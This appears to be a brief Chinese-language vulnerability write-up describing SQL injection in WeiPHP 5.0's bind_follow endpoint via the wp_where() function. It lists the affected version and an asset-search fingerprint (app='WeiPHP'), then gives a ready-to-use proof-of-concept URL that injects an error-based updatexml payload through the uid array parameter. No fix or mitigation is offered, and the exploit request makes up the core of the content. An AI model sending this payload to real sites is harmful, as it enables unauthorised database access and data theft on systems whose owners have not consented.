# WeiPHP5.0 bind_follow SQL注入漏洞

## 漏洞描述

Weiphp5.0 所有使用了 wp_where() 函数并且参数可控的SQL查询均受到影响，前台后台均存在注入。

## 漏洞影响

  <a-checkbox checked>Weiphp5.0</a-checkbox></br>

## 网络测绘

  <a-checkbox checked>app="WeiPHP"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1628497681576-0cd015d8-cfef-4dcc-9f5a-e51a95136802.png)

验证POC

```php
/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+
```